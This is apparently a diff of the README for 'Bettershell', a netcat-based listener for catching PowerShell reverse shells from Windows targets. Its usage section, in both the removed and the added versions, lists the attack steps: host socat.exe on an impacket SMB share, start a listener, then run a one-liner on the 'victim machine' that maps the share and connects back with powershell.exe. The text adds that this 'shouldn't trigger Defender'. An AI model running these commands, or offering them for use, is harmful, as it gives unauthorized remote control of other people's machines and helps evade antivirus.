@@ -1,17 +1,27 @@
-Bettershell is a basic netcat client paired with rlwrap, socat, a large Powershell command wordlist, and bash scripting.
+# Bettershell
+Bettershell is a basic netcat client, supercharged with rlwrap, socat, a large Powershell command wordlist, and bash scripting.
 
-Using bettershell in place of a typical nc listener, you can catch Powershell reverse shells that don't die on ctrl+c, autocomplete based on wordlist entries and command output, allow arrowkey movement to edit pasted commands without those annoying symbols, and that reference a searchable command history. You also get an accurate path prompt with no weird command echo.
+### Features:
+* Shells won't die on CTRL+C
+* Tab autocomplete based on a Windows command list
+* Filesystem tab autocomplete, thanks to rlwrap's smart output parser
+* Working arrowkey movement
+* Searchable command history with CTRL+W
+* An accurate path prompt
+* No double echo of commands
+* It's blue! Is it really powershell if it isn't blue?
 
-Best of all, it's blue. Is it really powershell if it isn't blue?
+Although bettershell can be used to catch any reverse shell from a Windows box, the included 'socat.exe' binary is strongly recommended to properly pipe stderr messages to your listener - visible error messages are invaluable when privilege-escalating.
+## Usage
 
-Bettershell can be used to catch any reverse shell from a Windows box. For stderr piping support, the included socat.exe binary can easily be executed on the victim from an SMB share.
-
-To do so, open port 445, then start up an impacket SMB server on your attack box in the directory with socat.exe:
+Open port 445, then start up an impacket SMB server on your attack box in the same directory as socat.exe:
 ```
 sudo smbserver.py SMB . -comment SMB -ts -debug -smb2support -username user -password pass
 ```
-to get a reverse shell, execute the following on your victim box:
+Start a listener in another window: ```./bettershell -nlvp yourPORT```
+
+Lastly, execute the following on the victim machine:
 ```
-cmd.exe /c net use x: \\YOURIP\SMB /user:user pass & x:\socat.exe tcp-connect:$IP:$PORT exec:powershell.exe,pty,stderr
+cmd.exe /c net use x: \\yourIP\SMB /user:user pass & x:\socat.exe tcp-connect:yourIP:yourPORT exec:powershell.exe,pty,stderr
 ```
-The above example shouldn't trigger Defender. Exclude authentication when attacking PCs that don't support it.
+The above example shouldn't trigger Defender. Exclude authentication when attacking older PCs that don't support it.
